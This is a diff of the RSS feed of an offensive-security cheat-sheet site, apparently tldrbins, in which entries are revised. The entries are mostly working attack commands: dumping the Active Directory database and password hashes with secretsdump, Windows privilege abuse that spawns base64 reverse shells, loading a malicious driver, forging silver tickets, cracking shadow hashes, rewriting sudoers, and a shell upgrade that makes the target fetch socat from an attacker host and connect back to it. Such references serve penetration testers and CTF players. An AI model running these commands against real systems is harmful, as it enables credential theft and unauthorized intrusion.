+      <description>Abuse #1: Robocopy # For example robocopy /b &amp;lt;TARGET_DIR_PATH&amp;gt; C:\Windows\Tasks &amp;lt;TARGET_FILE&amp;gt; Abuse #2: Using helper dlls import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege &amp;lt;TARGET_FILE_PATH&amp;gt; C:\ProgramData\&amp;lt;TARGET_FILE&amp;gt; # For example Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit Ref: SeBackupPrivilegeUtils.dll Ref: SeBackupPrivilegeCmdLets.dll&#xA;Abuse #3: Diskshadow 1. Create a .dsh file set context persistent nowriters set metadata C:\ProgramData\test.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh 2. Run vss.</description>
     </item>
     <item>
       <title>secretsdump</title>
       <link>https://tldrbins.github.io/secretsdump/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secretsdump/</guid>
-      <description> With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump impacket-secretsdump &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; nxc nxc smb -dc-ip &amp;lt;DC&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; --ntds </description>
+      <description> Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite&#xA;With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With Dcsync right impacket nxc impacket-secretsdump &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; nxc smb -dc-ip &amp;lt;DC&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; --ntds </description>
     </item>
     <item>
       <title>Secure String</title>
       <link>https://tldrbins.github.io/secrue_string/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secrue_string/</guid>
-      <description> Decrypt secure string $s = cat pass.xml $ss = Convertto-securestring -string $s $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist &amp;#34;administrator&amp;#34;, $ss $cred.GetNetworkCredential().password </description>
+      <description> Decrypt secure string Windows $s = cat pass.xml $ss = Convertto-securestring -string $s $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist &amp;#34;administrator&amp;#34;, $ss $cred.GetNetworkCredential().password </description>
     </item>
     <item>
       <title>SeDebugPrivilege</title>
       <link>https://tldrbins.github.io/sedebugprivilege/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/sedebugprivilege/</guid>
-      <description> Abuse #1: Meterpreter Migrate # Inside meterpreter ps winlogon migrate &amp;lt;PID&amp;gt; Abuse #2 : psgetsys.ps1 psgetsys&#xA;# Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid &amp;lt;PID&amp;gt; -command &amp;#34;c:\windows\system32\cmd.exe&amp;#34; -cmdargs &amp;#34;/c &amp;lt;powershell #3 Base64&amp;gt;&amp;#34; </description>
+      <description>Tools Metasploit psgetsys.ps1 # Inside meterpreter ps winlogon # Explorer.exe is a good candidate migrate &amp;lt;PID&amp;gt; # Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid &amp;lt;PID&amp;gt; -command &amp;#34;c:\windows\system32\cmd.exe&amp;#34; -cmdargs &amp;#34;/c &amp;lt;powershell #3 Base64&amp;gt;&amp;#34; Ref: psgetsys</description>
     </item>
     <item>
       <title>SeImpresonate</title>
       <link>https://tldrbins.github.io/seimpresonate/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/seimpresonate/</guid>
-      <description>Abuse #1: Recover SeImpresonate FullPower&#xA;.\FullPowers.exe -c &amp;#34;whoami /priv&amp;#34; # Revshell .\FullPowers.exe -c &amp;#34;&amp;lt;powershell #3 Base64&amp;gt;&amp;#34; Abuse #2: Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = &amp;#34;SeAssignPrimaryTokenPrivilege&amp;#34;, &amp;#34;SeAuditPrivilege&amp;#34;, &amp;#34;SeChangeNotifyPrivilege&amp;#34;, &amp;#34;SeCreateGlobalPrivilege&amp;#34;, &amp;#34;SeImpersonatePrivilege&amp;#34;, &amp;#34;SeIncreaseQuotaPrivilege&amp;#34;, &amp;#34;SeIncreaseWorkingSetPrivilege&amp;#34;, &amp;#34;SeTimeZonePrivilege&amp;#34; # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId &amp;#34;&amp;lt;SERVICE_ACCOUNT&amp;gt;&amp;#34; -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute &amp;#34;powershell.exe&amp;#34; -Argument &amp;#34;-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.</description>
+      <description>Abuse #1: Recover SeImpresonate .\FullPowers.exe -c &amp;#34;whoami /priv&amp;#34; # Revshell .\FullPowers.exe -c &amp;#34;&amp;lt;powershell #3 Base64&amp;gt;&amp;#34; Ref: FullPower&#xA;Abuse #2: Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = &amp;#34;SeAssignPrimaryTokenPrivilege&amp;#34;, &amp;#34;SeAuditPrivilege&amp;#34;, &amp;#34;SeChangeNotifyPrivilege&amp;#34;, &amp;#34;SeCreateGlobalPrivilege&amp;#34;, &amp;#34;SeImpersonatePrivilege&amp;#34;, &amp;#34;SeIncreaseQuotaPrivilege&amp;#34;, &amp;#34;SeIncreaseWorkingSetPrivilege&amp;#34;, &amp;#34;SeTimeZonePrivilege&amp;#34; # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId &amp;#34;&amp;lt;SERVICE_ACCOUNT&amp;gt;&amp;#34; -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute &amp;#34;powershell.exe&amp;#34; -Argument &amp;#34;-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.</description>
     </item>
     <item>
       <title>SeLoadDriverPrivilege</title>
       <link>https://tldrbins.github.io/seloaddriverprivilege/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/seloaddriverprivilege/</guid>
-      <description>Abuse #1: Install malicious driver 1. Compile eoploaddriver eoploaddriver.cpp&#xA;+---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` | | 7. Release -&amp;gt; x64 | | 8. Build -&amp;gt; Build Solution | | 9.</description>
+      <description>Abuse #1: Install malicious driver 1. Compile eoploaddriver +---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` | | 7. Release -&amp;gt; x64 | | 8. Build -&amp;gt; Build Solution | | 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.</description>
     </item>
     <item>
       <title>Server Operators</title>
@@ -943,42 +929,49 @@
       <link>https://tldrbins.github.io/shadow_hash_cracking/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/shadow_hash_cracking/</guid>
-      <description> Shadow Hash Cracking # Prepare an unshadowed hashes file unshadow passwd.txt shadow.txt &amp;gt; unshadowed.txt john john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt hashcat hashcat -m 7400 unshadowed.txt /usr/share/wordlists/rockyou.txt --force --user </description>
+      <description> Shadow Hash Cracking # Prepare an unshadowed hashes file unshadow passwd.txt shadow.txt &amp;gt; unshadowed.txt john hashcat john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt hashcat -m 7400 unshadowed.txt /usr/share/wordlists/rockyou.txt --force --user </description>
     </item>
     <item>
       <title>Silver Ticket</title>
       <link>https://tldrbins.github.io/silver_ticket/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/silver_ticket/</guid>
-      <description>From Windows 1. Get service principle name (SPN) .\rubeus.exe kerberoast /domain:&amp;lt;DOMAIN&amp;gt; /dc:&amp;lt;DC&amp;gt; /creduser:&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt; /credpassword:&amp;lt;PASSWORD&amp;gt; /nowrap 2. Generate NTLM .\rubeus.exe hash /password:&amp;lt;PASSWORD&amp;gt; 3. Get domain SID 3a. Locally import-module activedirectory Get-ADDomain | fl DomainSID 3b. Remotely # Install ldp.exe (Windows 11) Settings &amp;gt; System &amp;gt; Optional Features &amp;gt; More Windows Features and add &amp;#39;Active Driectory Lightweight Directory Services&amp;#39; # Bind &amp;gt; Bind with credentials ldp.exe # Browse &amp;gt; Search BaseDN: DC=&amp;lt;example&amp;gt;,DC=&amp;lt;com&amp;gt; Filter: (objectclass=User) 4.</description>
+      <description>Silver Ticket Attack Linux Windows 1. Get service principle name (SPN) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; -dc-ip &amp;lt;DC&amp;gt; -request -k # If NTLM auth is disabled sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; -dc-host &amp;lt;DC&amp;gt; -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#34;&amp;lt;PASSWORD&amp;gt;&amp;#34;) | openssl dgst -md4 3. Get domain SID sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getPac -targetUser administrator &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; 4. Generate Silver Ticket impacket-ticketer -nthash &amp;lt;HASH&amp;gt; -domain-sid &amp;lt;SID&amp;gt; -domain &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC&amp;gt; -spn &amp;lt;SPN&amp;gt; administrator 5.</description>
     </item>
     <item>
       <title>SMB Enum</title>
       <link>https://tldrbins.github.io/smb_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/smb_enum/</guid>
-      <description>SMB Share Enum nmap script sudo nmap --script=smb-enum-shares -p 445 &amp;lt;TARGET&amp;gt; Login without password smbmap smbmap -H &amp;lt;TARGET&amp;gt; --no-banner smbmap -H &amp;lt;TARGET&amp;gt; -u null --no-banner # List known share smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; smbclient smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ # After found an accessible share smbclient -N \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ --option=&amp;#39;client min protocol=NT1&amp;#39; Login with password smbmap smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; # List known share smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -R &amp;lt;SHARE&amp;gt; # Download file smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; --download &amp;lt;PATH/TO/FILE&amp;gt; # List files with regex pattern smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -r &amp;lt;SHARE&amp;gt; -A &amp;lt;FILE_PATTERN&amp;gt; smbclient smbclient -L \\\\&amp;lt;TARGET&amp;gt;\\ -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; # After found an accessible share smbclient \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; smbclient Basic Commands # List all files in a share recurse ON ls # Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * impacket-smbclient (Kerberos) impacket-smbclient &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass SID Brute # Null auth allowed impacket-lookupsid test@&amp;lt;DOMAIN&amp;gt; -no-pass Mount SMB Share sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt # With creds sudo mount -t cifs -o ro,user=&amp;lt;USER&amp;gt;,password=&amp;lt;PASSWORD&amp;gt; //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt Check write permission sudo find .</description>
+      <description>SMB Share Enum nmap sudo nmap --script=smb-enum-shares -p 445 &amp;lt;TARGET&amp;gt; Anonymous Login smbmap smbclient impacket smbmap -H &amp;lt;TARGET&amp;gt; --no-banner smbmap -H &amp;lt;TARGET&amp;gt; -u null --no-banner # List known share smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ # After found an accessible share smbclient -N \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ --option=&amp;#39;client min protocol=NT1&amp;#39; # SID brute, if null auth allowed impacket-lookupsid test@&amp;lt;DOMAIN&amp;gt; -no-pass Authenticated smbmap smbclient smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; # List known share smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -R &amp;lt;SHARE&amp;gt; # Download file smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; --download &amp;lt;PATH/TO/FILE&amp;gt; # List files with regex pattern smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -r &amp;lt;SHARE&amp;gt; -A &amp;lt;FILE_PATTERN&amp;gt; smbclient -L \\\\&amp;lt;TARGET&amp;gt;\\ -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; # After found an accessible share smbclient \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; Authenticated with Kerberos impacket impacket-smbclient &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass Basic commands # List all files in a share recurse ON ls # Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * List Alternate Data Streams (ADS) allinfo &amp;lt;FILE&amp;gt; # Example Response &amp;gt;&amp;gt;&amp;gt;stream: [:Password:$DATA], 15 bytes # Download specific data stream get &amp;#34;&amp;lt;FILE&amp;gt;:Password&amp;#34; Mount SMB Share Anonymous Authenticated sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt sudo mount -t cifs -o ro,user=&amp;lt;USER&amp;gt;,password=&amp;lt;PASSWORD&amp;gt; //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt Check write permission sudo find .</description>
+    </item>
+    <item>
+      <title>SMB Server</title>
+      <link>https://tldrbins.github.io/smb_server/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/smb_server/</guid>
+      <description> Start a SMB Server for File Transfer Anonymous Authenticate Older Windows impacket-smbserver share . -smb2support impacket-smbserver share . -smb2support -username &amp;lt;USER&amp;gt; -password &amp;lt;PASSWORD&amp;gt; Note: Sometimes smb server with creds may not work&#xA;impacket-smbserver share . </description>
     </item>
     <item>
       <title>SMTP</title>
       <link>https://tldrbins.github.io/smtp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/smtp/</guid>
-      <description>Simple Mail Debugging Server #!/usr/bin/env python3 import aiosmtpd.controller class CustomSMTPHandler: async def handle_DATA(self, server, session, envelope): print(f&amp;#34;[+] Received a mail.&amp;#34;) print(&amp;#34;=&amp;#34; * 50) print(envelope.content.decode()) print(&amp;#34;=&amp;#34; * 50) return &amp;#34;250 OK&amp;#34; handler = CustomSMTPHandler() server = aiosmtpd.controller.Controller(handler, hostname=&amp;#34;0.0.0.0&amp;#34;, port=25) server.start() print(&amp;#34;[*] Listening on 0.0.0.0:25&amp;#34;) input(&amp;#34;[*] Server started. Press Return to quit.\n&amp;#34;) server.stop() User Enum nmap script nmap -p 25 --script=smtp-enum-users &amp;lt;TARGET&amp;gt; smtp-user-enum # Use RCPT smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t &amp;lt;TARGET&amp;gt; # Use VRFY smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.</description>
+      <description>Simple Mail Debugging Server #!/usr/bin/env python3 import aiosmtpd.controller class CustomSMTPHandler: async def handle_DATA(self, server, session, envelope): print(f&amp;#34;[+] Received a mail.&amp;#34;) print(&amp;#34;=&amp;#34; * 50) print(envelope.content.decode()) print(&amp;#34;=&amp;#34; * 50) return &amp;#34;250 OK&amp;#34; handler = CustomSMTPHandler() server = aiosmtpd.controller.Controller(handler, hostname=&amp;#34;0.0.0.0&amp;#34;, port=25) server.start() print(&amp;#34;[*] Listening on 0.0.0.0:25&amp;#34;) input(&amp;#34;[*] Server started. Press Return to quit.\n&amp;#34;) server.stop() Users Enum nmap script smtp-user-enum nmap -p 25 --script=smtp-enum-users &amp;lt;TARGET&amp;gt; # Use RCPT smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t &amp;lt;TARGET&amp;gt; # Use VRFY smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.</description>
     </item>
     <item>
       <title>SNMP</title>
       <link>https://tldrbins.github.io/snmp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/snmp/</guid>
-      <description>onesixtyone Download onesixtyone&#xA;# Brute force community string for snmpwalk use onesixtyone &amp;lt;TARGET&amp;gt; -c /usr/share/doc/onesixtyone/dict.txt snmpbrute snmpbrute.py&#xA;# Brute force community string (Check also SNMPv2) python3 snmpbrute.py -t &amp;lt;TARGET&amp;gt; snmpwalk Installation sudo apt install snmp # Install Add-on for better result readability sudo apt install snmp-mibs-downloader # Comment out this line in /etc/snmp/snmp.conf # mibs : # Uncomment this line in /etc/snmp/snmp.conf mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf Basic Commands snmpwalk -v1 -c public &amp;lt;TARGET&amp;gt; | tee snmpwalk_result snmpwalk -v2c -c public &amp;lt;TARGET&amp;gt; | tee snmpwalk_result # Query specific OID, e.</description>
+      <description>Bruteforce commmuity string onesixtyone snmpbrute # Brute force community string for snmpwalk use onesixtyone &amp;lt;TARGET&amp;gt; -c /usr/share/doc/onesixtyone/dict.txt Ref: onesixtyone&#xA;# Brute force community string (Check also SNMPv2) python3 snmpbrute.py -t &amp;lt;TARGET&amp;gt; Ref: snmpbrute.py&#xA;Tools snmpwalk snmpbulkwalk # Install sudo apt install snmp # Install Add-on for better result readability sudo apt install snmp-mibs-downloader # Comment out this line in /etc/snmp/snmp.conf # mibs : # Uncomment this line in /etc/snmp/snmp.conf mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf Basic Commands snmpwalk -v1 -c public &amp;lt;TARGET&amp;gt; | tee snmpwalk_result snmpwalk -v2c -c public &amp;lt;TARGET&amp;gt; | tee snmpwalk_result # Query specific OID, e.</description>
     </item>
     <item>
       <title>SQL Injection</title>
       <link>https://tldrbins.github.io/sql_injection/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/sql_injection/</guid>
-      <description>sqlmap Download sqlmap&#xA;# In Burp Suite, we can right click the request and click `copy to file` to save the request # And add `*` to request to indicate the sql injection point # Initial testing HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # Initial testing HTTPS sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # Add a string to indicate injection succeed (e.</description>
+      <description>sqlmap # In Burp Suite, we can right click the request and click `copy to file` to save the request # And add `*` to request to indicate the sql injection point # Initial testing HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # Initial testing HTTPS sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # Add a string to indicate injection succeed (e.</description>
     </item>
     <item>
       <title>SQLite</title>
@@ -999,35 +992,35 @@
       <link>https://tldrbins.github.io/ssh/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ssh/</guid>
-      <description>Check SSH version openssh-server (ubuntu) openssh-server (debian)&#xA;Config Location /etc/ssh/sshd_config # Grep contents grep -Ev &amp;#34;^#&amp;#34; /etc/ssh/sshd_config | grep . Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Check Public Key ssh-keygen -l -f id_rsa Generate no passphrase SSH key from encrypted key openssl rsa -in id_rsa_encrypted -out ./id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo &amp;lt;id_rsa.</description>
+      <description>Check SSH version openssh-server (ubuntu)&#xA;openssh-server (debian)&#xA;Config Location /etc/ssh/sshd_config # Grep contents grep -Ev &amp;#34;^#&amp;#34; /etc/ssh/sshd_config | grep . Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Check Public Key ssh-keygen -l -f id_rsa Generate no passphrase SSH key from encrypted key openssl rsa -in id_rsa_encrypted -out ./id_rsa Convert .ppk to .pem format # Install sudo apt install putty-tools # Convert to private key in pem format puttygen key.</description>
     </item>
     <item>
       <title>SSL</title>
       <link>https://tldrbins.github.io/ssl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ssl/</guid>
-      <description>sslscan # Scan target SSL version sslscan &amp;lt;TARGET&amp;gt; Fix Old ssl Protocol Connection Problem # Edit /etc/ssl/openssl.cnf [system_default_sect] #MinProtocol = DEFAULT@SECLEVEL=2 MinProtocol = None #CipherString = DEFAULT@SECLEVEL=2 CipherString = None Note: Remember to revert the changes after job done</description>
+      <description>Tools sslscan # Scan target SSL version sslscan &amp;lt;TARGET&amp;gt; Fix old ssl protocol connection problem # Edit /etc/ssl/openssl.cnf [system_default_sect] #MinProtocol = DEFAULT@SECLEVEL=2 MinProtocol = None #CipherString = DEFAULT@SECLEVEL=2 CipherString = None Note: Remember to revert the changes after job done</description>
     </item>
     <item>
       <title>Steganography</title>
       <link>https://tldrbins.github.io/steganography/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/steganography/</guid>
-      <description> exiftool exiftool &amp;lt;FILE&amp;gt; steg steghide # Always try with empty passphrase steghide extract -sf &amp;lt;FILE&amp;gt; </description>
+      <description> Tools exiftool steghide exiftool &amp;lt;FILE&amp;gt; # Always try with empty passphrase steghide extract -sf &amp;lt;FILE&amp;gt; </description>
     </item>
     <item>
       <title>Subdomain Enum</title>
       <link>https://tldrbins.github.io/subdomain_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/subdomain_enum/</guid>
-      <description>wfuzz download wfuzz&#xA;wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com --hw 10 Filter out response with header # For example: Access-Control-Allow-Origin wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Origin: http://FUZZ.example.com&amp;#34; --filter &amp;#34;r.headers.response ~ &amp;#39;Access-Control-Allow-Origin&amp;#39;&amp;#34; -u http://example.com gobuster gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://example.com Add domain/subdomain to /etc/hosts echo &amp;#34;10.10.11.10 example.</description>
+      <description>Add domain/subdomain to /etc/hosts echo &amp;#34;10.10.11.10 example.com&amp;#34; | sudo tee -a /etc/hosts wfuzz gobuster wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com --hw 10 Filter out response with header # For example: Access-Control-Allow-Origin wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Origin: http://FUZZ.example.com&amp;#34; --filter &amp;#34;r.headers.response ~ &amp;#39;Access-Control-Allow-Origin&amp;#39;&amp;#34; -u http://example.com gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.</description>
     </item>
     <item>
       <title>sudoers</title>
       <link>https://tldrbins.github.io/sudoers/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/sudoers/</guid>
-      <description> Privesc Abuse /etc/sudoers # IF you have control over `/etc/sudoers` chmod 600 /etc/sudoers echo &amp;#39;&amp;lt;USER&amp;gt; ALL=(ALL) NOPASSWD: ALL&amp;#39; &amp;gt;&amp;gt; /etc/sudoers chmod 440 /etc/sudoers </description>
+      <description> Abuse #1: Writable /etc/sudoers chmod 600 /etc/sudoers echo &amp;#39;&amp;lt;USER&amp;gt; ALL=(ALL) NOPASSWD: ALL&amp;#39; &amp;gt;&amp;gt; /etc/sudoers chmod 440 /etc/sudoers </description>
     </item>
     <item>
       <title>TFTP</title>
@@ -1041,7 +1034,7 @@
       <link>https://tldrbins.github.io/upgrade_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/upgrade_shell/</guid>
-      <description>Upgrade Shell Check installed binary which sh which bash which python3 which python python python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color socat Download socat&#xA;# Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.</description>
+      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color # Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.10.14.10/socat -O /tmp/socat &amp;amp;&amp;amp; chmod +x /tmp/socat &amp;amp;&amp;amp; /tmp/socat exec:&amp;#39;bash -li&amp;#39;,pty,stderr,setsid,sigint,sane tcp:10.</description>
     </item>
     <item>
       <title>VNC</title>
@@ -1055,28 +1048,28 @@
       <link>https://tldrbins.github.io/volume_shadow_copies/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/volume_shadow_copies/</guid>
